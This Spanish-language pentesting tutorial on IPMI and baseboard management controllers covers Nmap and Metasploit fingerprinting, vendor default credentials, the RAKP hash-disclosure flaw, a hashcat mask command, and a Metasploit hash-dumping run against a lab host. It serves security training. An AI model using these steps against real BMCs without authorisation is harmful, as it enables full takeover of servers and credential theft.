
-------------
#hosts #ipmi #servicios 

---------------

## Huella del servicio

IPMI se comunica a través del puerto 623 UDP. Los sistemas que utilizan el protocolo IPMI se denominan controladores de administración de placa base (BMC). Por lo general, los BMC se implementan como sistemas ARM integrados que ejecutan Linux y se conectan directamente a la placa base del host. Los BMC están integrados en muchas placas base, pero también se pueden agregar a un sistema como una tarjeta PCI. La mayoría de los servidores vienen con un BMC o admiten la adición de un BMC. Los BMC más comunes que vemos a menudo durante las pruebas de penetración internas son HP iLO, Dell DRAC y Supermicro IPMI. Si podemos acceder a un BMC durante una evaluación, obtendríamos acceso completo a la placa base host y podríamos monitorear, reiniciar, apagar o incluso reinstalar el sistema operativo host. Obtener acceso a un BMC es casi equivalente al acceso físico a un sistema. Muchos BMC (incluidos HP iLO, Dell DRAC y Supermicro IPMI) exponen una consola de administración basada en la web, algún tipo de protocolo de acceso remoto de línea de comandos como Telnet o SSH, y el puerto 623 UDP, que, nuevamente, es para el protocolo de red IPMI. A continuación se muestra un ejemplo de análisis de Nmap que utiliza el script NSE [de la versión ipmi de](https://nmap.org/nsedoc/scripts/ipmi-version.html) Nmap para colocar el servicio.

#### Nmap

  IPMI

```shell-session
zunderrubb@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Aquí, podemos ver que el protocolo IPMI está escuchando en el puerto 623, y Nmap tiene huellas dactilares de la versión 2.0 del protocolo. También podemos utilizar el módulo de escáner de Metasploit [IPMI Information Discovery (auxiliar/scanner/ipmi/ipmi_version).](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/)

#### Escaneo de la versión de Metasploit

  IPMI

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Durante las pruebas de penetración internas, a menudo encontramos BMC en los que los administradores no han cambiado la contraseña predeterminada. Algunas contraseñas predeterminadas únicas que se pueden mantener en nuestras hojas de referencia incluyen:

|Producto|Nombre de usuario|Contraseña|
|---|---|---|
|Dell iDRAC|raíz|Calvin|
|HP iLO|Administrador|Cadena aleatoria de 8 caracteres que consta de números y letras mayúsculas|
|Supermicro IPMI|ADMIN|ADMIN|

También es esencial probar contraseñas predeterminadas conocidas para CUALQUIER servicio que descubramos, ya que a menudo se dejan sin cambios y pueden conducir a ganancias rápidas. Cuando se trata de BMC, estas contraseñas predeterminadas pueden darnos acceso a la consola web o incluso acceso a la línea de comandos a través de SSH o Telnet.

---

## Configuraciones peligrosas

Si las credenciales predeterminadas no funcionan para acceder a un BMC, podemos recurrir a una [falla](http://fish2.com/ipmi/remote-pw-cracking.html) en el protocolo RAKP en IPMI 2.0. Durante el proceso de autenticación, el servidor envía un hash SHA1 o MD5 salado de la contraseña del usuario al cliente antes de que se lleve a cabo la autenticación. Esto se puede aprovechar para obtener el hash de contraseña para CUALQUIER cuenta de usuario válida en el BMC. Estos hashes de contraseña se pueden descifrar sin conexión mediante un ataque de diccionario usando el modo . En el caso de que un HP iLO use una contraseña predeterminada de fábrica, podemos usar este comando de ataque de máscara Hashcat que prueba todas las combinaciones de letras mayúsculas y números para una contraseña de ocho caracteres.`Hashcat``7300``hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`

No hay una "solución" directa a este problema porque la falla es un componente crítico de la especificación IPMI. Los clientes pueden optar por contraseñas muy largas y difíciles de descifrar o implementar reglas de segmentación de red para restringir el acceso directo a los BMC. Es importante no pasar por alto IPMI durante las pruebas de penetración internas (lo vemos durante la mayoría de las evaluaciones) porque no solo a menudo podemos obtener acceso a la consola web de BMC, lo cual es un hallazgo de alto riesgo, sino que hemos visto entornos en los que se establece una contraseña única (pero descifrable) que luego se reutiliza en otros sistemas. En una de esas pruebas de penetración, obtuvimos un hash IPMI, lo desciframos fuera de línea usando Hashcat y pudimos usar SSH en muchos servidores críticos del entorno como usuario root y obtener acceso a las consolas de administración web para varias herramientas de monitoreo de red.

Para recuperar hashes IPMI, podemos usar el módulo Metasploit [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) .

#### Hashes de volcado de Metasploit

  IPMI

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
